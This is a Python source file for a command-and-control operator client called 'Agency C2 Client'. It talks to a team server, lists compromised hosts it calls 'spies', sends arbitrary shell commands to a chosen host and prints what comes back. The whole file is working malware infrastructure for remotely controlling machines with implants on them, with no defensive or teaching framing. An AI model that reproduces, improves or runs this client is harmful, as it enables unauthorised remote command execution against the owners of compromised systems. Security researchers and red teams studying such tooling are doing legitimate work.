import asyncio
import aiohttp
import argparse

# Global variable for the current prompt
current_prompt = ""

async def poll_for_output(session, server, agent, stop_polling):
    global current_prompt
    while not stop_polling.is_set():
        try:
            async with session.get(f'{server}/spy/{agent}') as response:
                if response.status == 200:
                    data = await response.json()
                    if 'output' in data and data['output']:
                        print("\n---------- Command Output ----------\n", flush=True)
                        print(data['output'], flush=True)
                        print("\n------------------------------------\n", flush=True)
                        await session.get(f'{server}/cls/{agent}')
                        print(current_prompt, end='', flush=True)  # Reprint the current prompt
                await asyncio.sleep(1)  # Polling interval
        except Exception as e:
            print(f"Error in poll_for_output: {e}")
            await asyncio.sleep(1)

async def send_command(session, server, agent, command):
    await session.get(f'{server}/mission/{agent}/{command}')

async def async_input(prompt):
    return await asyncio.to_thread(input, prompt)

async def main(ip, port, name):
    global current_prompt
    server = f"http://{ip}:{port}"
    agent = 0
    stop_polling = asyncio.Event()

    async with aiohttp.ClientSession() as session:  # Single session for all requests
        while True:
            if agent:
                if 'poll_task' not in locals() or poll_task.done():
                    stop_polling.clear()
                    poll_task = asyncio.create_task(poll_for_output(session, server, agent, stop_polling))

            current_prompt = f"Agency C2 Client {name} $ > " if agent == 0 else f"Spy {agent} # > "
            command = await async_input(current_prompt)

            if command.startswith("list"):
                async with session.get(f'{server}/spies') as response:
                    text = await response.text()
                    print(text.replace("<p>", "").replace("</p>", "").replace("<br>", "\n"))
                continue

            if command.startswith("spy"):
                if agent != 0:
                    stop_polling.set()
                agent = command.split()[1]
                continue

            if command.startswith("shell") and agent != 0:
                shell_command = ' '.join(command.split()[1:])
                await send_command(session, server, agent, shell_command)
                continue

            if command == "help":
                print("\nHelp Menu")
                print("===Command===")
                print("list: List all active spies")
                print("spy <id>: Select spy No.id")
                print("shell <command>: Execute command and display the output")
                print("help: Display this menu")
                print("exit: Exit Agency C2 Client\n\n")

            if command == "exit":
                stop_polling.set()
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', required=True, help='Team server IP')
    parser.add_argument('--port', required=True, help='Port of the listener')
    parser.add_argument('--name', required=True, help='Your name')
    args = parser.parse_args()

    asyncio.run(main(args.ip, args.port, args.name))
